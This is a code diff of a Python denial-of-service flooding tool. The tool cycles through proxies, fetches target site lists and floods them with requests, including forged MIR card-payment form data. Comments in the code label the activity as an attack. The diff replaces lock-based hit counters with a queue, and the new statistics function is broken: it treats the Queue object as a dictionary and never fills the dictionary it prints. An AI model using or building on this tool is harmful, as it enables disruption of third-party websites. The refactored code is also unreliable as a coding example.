@@ -20,6 +20,7 @@ from time import sleep
 from urllib3 import disable_warnings
 from pyuseragents import random as random_useragent
 from json import loads
+from queue import Queue
 
 disable_warnings()
 logger.remove()
@@ -29,7 +30,6 @@ logger.add(sys.stdout, colorize=True, format="<green>{time}</green> <level>{mess
 # logger.add(sys.stdout, serialize=True)
 threads = int(input('Кількість потоків: '))
 
-counter_by_sites = {}
 
 ALLOVED_PAREQ_CHARS = string.ascii_letters + string.digits
 ALLOVED_MD_CHARS = string.digits
@@ -63,14 +63,13 @@ def generate_MIR_data(url):
     return dat
 
 
-def mainth(protocol, ip, proxy_name, region, lock):
+def mainth(protocol, ip, proxy_name, region, queue_counters):
     # Fetching data with proxy and targets
     sites = get_sites()
 
     counter403 = {}
 
     counter_total = 0
-    counter_by_sites[proxy_name] = {}
 
     while True:
         counter_total += 1
@@ -78,9 +77,6 @@ def mainth(protocol, ip, proxy_name, region, lock):
             sites = get_sites()
             proxies = get_proxies()
             (protocol, ip, proxy_name, region) = choice(proxies)
-            lock.acquire()
-            counter_by_sites[proxy_name] = {}
-            lock.release()
         scraper = base_scraper()
         # logger.info("GET RESOURCES FOR ATTACK")
         # data = choice(sites)
@@ -102,11 +98,6 @@ def mainth(protocol, ip, proxy_name, region, lock):
             sites.pop(index_)
             continue
 
-        lock.acquire()
-        if current_target not in counter_by_sites[proxy_name]:
-            counter_by_sites[proxy_name][current_target] = {}
-        lock.release()
-
         cur_proxy = ip
         scraper.proxies.update({'http': cur_proxy,
                                 'https': cur_proxy})
@@ -120,11 +111,7 @@ def mainth(protocol, ip, proxy_name, region, lock):
                                             generate_MIR_data(current_target))
                 else:
                     response = scraper.get(current_target)
-                lock.acquire()
-                if response.status_code not in counter_by_sites[proxy_name][current_target]:
-                    counter_by_sites[proxy_name][current_target][response.status_code] = 0
-                counter_by_sites[proxy_name][current_target][response.status_code] += 1
-                lock.release()
+                queue_counters.put({'proxy': proxy_name, 'target': current_target, 'status': response.status_code, 'value': 1})
 
                 if response.status_code == 404 or ((current_target in counter403) and (counter403[current_target] >= 30)):
                     sites.pop(index_)
@@ -139,11 +126,7 @@ def mainth(protocol, ip, proxy_name, region, lock):
 
             except Exception as err:
                 # logger.warning("GOT ISSUE WHILE ATTACKING " + current_target)
-                lock.acquire()
-                if 'exceptions' not in counter_by_sites[proxy_name][current_target]:
-                    counter_by_sites[proxy_name][current_target]['exceptions'] = 0
-                counter_by_sites[proxy_name][current_target]['exceptions'] += 1
-                lock.release()
+                queue_counters.put({'proxy': proxy_name, 'target': current_target, 'status': 'exceptions', 'value': 1})
                 sites.pop(index_)
                 break
 
@@ -181,12 +164,19 @@ def get_proxies():
 #     time.sleep(3)
 
 
-def stat_visualiser(lock):
+def stat_visualiser(queue_counters):
+    counter_by_sites = {}
     while True:
+        rec = queue_counters.get(block=True)
+        if rec['proxy'] not in queue_counters:
+            queue_counters[rec['proxy']] = {}
+        if rec['target'] not in queue_counters[rec['proxy']]:
+            queue_counters[rec['proxy']][rec['target']] = {}
+        if rec['status'] not in queue_counters[rec['proxy']][rec['target']]:
+            queue_counters[rec['proxy']][rec['target']][rec['status']] = 0
+        queue_counters[rec['proxy']][rec['target']][rec['status']] = rec['value']
         # {extra[proxy]} {extra[target]} {extra[err_code]} {extra[err_count]}
-        lock.acquire()
         logger.info(json.dumps(counter_by_sites, indent=4, sort_keys=True))
-        lock.release()
         # for proxy, targets in counter_by_sites.items():
         #     logger.info(proxy + ":", enqueue=True)
         #     for target, counters in targets.items():
@@ -199,11 +189,11 @@ def stat_visualiser(lock):
 
 
 if __name__ == '__main__':
-    lock = Lock()
+    queue_counters = Queue()
     proxies = get_proxies()
     for _ in range(threads):
         args_ = choice(proxies)
-        Thread(target=mainth, args=args_ + [lock]).start()
+        Thread(target=mainth, args=args_ + [queue_counters]).start()
 
     Thread(target=cleaner, daemon=True).start()
-    Thread(target=stat_visualiser, args=(lock, )).start()
+    Thread(target=stat_visualiser, args=(queue_counters, )).start()
